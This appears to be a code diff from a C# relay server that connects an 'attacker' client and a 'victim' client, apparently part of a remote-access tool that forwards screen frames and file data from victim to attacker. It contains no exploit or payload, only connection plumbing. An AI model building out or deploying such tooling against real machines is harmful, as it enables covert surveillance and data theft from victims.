@@ -79,13 +79,17 @@ namespace ExtremLink_Server.Classes
             }
         }
 
+        // Constructor:
         private Server()
         {
             this.respond = "";
             this.serverIpAddress = this.FindIpAddress();
+            this.attacker = new Client(this.serverIpAddress, TypeOfClient.attacker);
+            this.victim = new Client(this.serverIpAddress, TypeOfClient.victim);
         }
 
-        // Connecting functions:
+
+        // Finding ip address function:
         private string FindIpAddress()
         {
             // The function gets nothing.
@@ -93,44 +97,39 @@ namespace ExtremLink_Server.Classes
             IPAddress[] localIpsAddr = Dns.GetHostAddresses(Dns.GetHostName());
             return Convert.ToString(localIpsAddr[localIpsAddr.Length - 1]);
         }
+
+
+        // Connecting functions:
         public void ConnectToClients()
         {
             // Input: Nothing.
             // Output: The function wait for clients (both attacker and victims) to connect to the server.
-            Client temp1 = new Client(this.serverIpAddress);
-            temp1.ConnectToClient();
-            List<object> ruleMessage = temp1.GetTCPMessageFromClient();
-            switch (ruleMessage[2])
-            {
-                case "attacker":
-                    this.attacker = temp1;
-                    this.victim = new Client(this.serverIpAddress);
-                    this.victim.ConnectToClient();
-                    break;
-                case "victim":
-                    this.victim = temp1;
-                    this.attacker = new Client(this.serverIpAddress);
-                    this.attacker.ConnectToClient();
-                    break;
-            }
+            Task.Run(() => this.ConnectToAttacker());
+            Task.Run(() => this.ConnectToVictim());
         }
-
-
-        // A function which starts the messages handlers
-        public void Start()
+        private async Task ConnectToAttacker()
         {
-            // The function gets nothing.
-            // The function starts the tasks of the functions which handling with packets.
-            Task.Run(() => this.HandleUdpCommunication());
+            // Input: Nothing.
+            // Output: The function connects to the attacker.
+            await this.attacker.ConnectToClient();
             Task.Run(() => this.HandleAttackerTcpCommunication());
+        }
+        private async Task ConnectToVictim()
+        {
+            // Input: Nothing.
+            // Output: The function connects to the victim.
+            await this.victim.ConnectToClient();
             Task.Run(() => this.HandleVictimTcpCommunication());
+            Task.Run(() => this.HandleUdpCommunication());
         }
 
 
+
+        // Messages handlers
         private async Task HandleUdpCommunication()
         {
             // The function gets nothing.
-            // The fucntion handle with different type of TCP packets which are sent by the client.
+            // The fucntion handle with UDP packets which are sent by the client.
             // & - frames handling.
             while (true)
             {
@@ -503,7 +502,7 @@ namespace ExtremLink_Server.Classes
                 Array.Copy(fileContent, offset, packet, 12, size);         // Segment data
 
                 // Send packet
-                this.attacker.UdpSocket.SendTo(packet, new IPEndPoint(IPAddress.Parse(this.attacker.IpAddress), this.attacker.UDP_PORT));
+                this.attacker.UdpSocket.SendTo(packet, new IPEndPoint(IPAddress.Parse(this.attacker.IpAddress), this.attacker.ATTACKER_UDP_PORT));
             }
         }
 
